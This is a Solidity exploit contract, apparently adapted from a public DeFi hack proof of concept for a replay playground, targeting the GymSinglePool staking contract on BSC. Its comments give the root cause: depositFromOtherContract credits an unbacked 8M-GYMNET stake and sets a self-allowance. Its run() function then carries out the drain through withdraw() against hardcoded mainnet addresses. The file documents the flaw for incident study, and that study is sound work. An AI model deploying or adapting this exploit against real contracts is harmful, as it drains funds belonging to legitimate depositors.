// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-06-Gym_2).
//
// The DeFiHackLabs PoC (test/Gym_2_exp.sol) runs the attack INLINE in the
// Foundry `ContractTest` — `address(this)` is itself the attacker, and a
// `vm.warp()` advances time between the deposit and the withdraw. There is no
// standalone contract to deploy, and the recorder uses ONE block timestamp for
// the whole replay, so the two-call attack cannot be reproduced verbatim. This
// contract is a faithful, self-contained copy of that inline attack: it deposits
// the unbacked stake via `depositFromOtherContract` and immediately withdraws it
// via `withdraw` inside a single recorded `run()` call. The withdraw's lock
// check (`block.timestamp > withdrawalTimestamp`) would otherwise fail under a
// single timestamp, so the config flips `isInMigrationToVTwo = true` in setup
// (the contract's own migration bypass), which skips that require — mirroring
// the on-chain end state without changing the accounting.
//
// Logic, constants, and call ordering are copied verbatim from the registry test
// (test/Gym_2_exp.sol). The deposit amount (8_000_000e18 + 666) and the call
// arguments are unchanged; only the harness wrapping differs.
//
// @VULNERABILITY: GymSinglePool.depositFromOtherContract() → _autoDeposit() credits
// a staking position (user.totalDepositTokens += amount, UserDeposits pushed)
// and sets `token.approve(address(this), amount)` (a SELF-allowance on the pool's
// own GYMNET) but NEVER pulls the deposited tokens in — there is no
// safeTransferFrom(_from, address(this), amount). The subsequent withdraw() then
// spends that self-allowance to transferFrom(pool → attacker) the pool's own
// reserves, so the attacker receives 8,000,000.000…666 GYMNET it never paid for.
// Impact: Pool GYMNET reserves (belonging to legitimate depositors) are drained to attacker who provided no capital. Root cause is unauthenticated deposit crediting + incorrect assumption that credited deposits are backed by tokens in the contract.


interface IGymSinglePool {
    function depositFromOtherContract(uint256 _depositAmount, uint8 _periodId, bool isUnlocked, address _from) external;
    function withdraw(uint256 _depositId) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract GymSinglePoolDrain {
    // --- mainnet constants (BSC) — copied verbatim from the registry test ---
    // The GymSinglePool PROXY (holds the GYMNET reserves and the storage the
    // delegatecall impl writes against).
    IGymSinglePool constant gympool =
        IGymSinglePool(0xA8987285E100A8b557F06A7889F79E0064b359f2);
    IERC20 constant gymnet = IERC20(0x3a0d9d7764FAE860A659eb96A500F1323b411e68);

    // The recorded entrypoint. Mirrors ContractTest.testExploit() verbatim:
    //   1. depositFromOtherContract(8e24+666, periodId=0, isUnlocked=true, _from=this)
    //      — books an 8M-GYMNET *unlocked* stake for this contract, paying NOTHING.
    //        The pool also sets allowance[pool][pool] = 8e24+666 (self-approval).
    //   2. withdraw(0) — after the (bypassed) lock, transferFrom(pool → this, 8e24+666)
    //      ships the pool's own GYMNET here, drawn straight from its reserves.
    // The original test warps time between the two calls; the recorder uses one
    // timestamp, so the config sets isInMigrationToVTwo=true in setup to skip the
    // lock require (the withdraw's `if(!isInMigrationToVTwo) require(...)` guard).
    function run() external {
        // @VULNERABILITY: See full root-cause analysis and @VULNERABILITY annotations in sources/GymSinglePool_0288FB/contracts_GymSinglePool.sol (depositFromOtherContract lacks access control; _autoDeposit does self-approve but no incoming transferFrom, enabling drain on withdraw via that allowance).
        // Impact: Attacker drains 8M+ GYMNET from the pool's reserves (real depositors' funds) by creating a zero-cost stake record for address(this).
        // @EXPLOIT_STEP 1: Invoke depositFromOtherContract with huge unbacked amount, unlocked, _from=self. Credits the position + creates pool-self-allowance on GYMNET with zero tokens transferred in. (Bypasses the token accounting invariant that deposits must bring capital.)
        gympool.depositFromOtherContract(8_000_000_000_000_000_000_000_666, 0, true, address(this));
        // @EXPLOIT_STEP 2: Immediately withdraw(0). The lock guard may be satisfied by migration flag in harness or prior state; regardless, the transferFrom succeeds using the self-allowance, extracting the pool's GYMNET to the attacker contract.
        gympool.withdraw(0);
    }
}
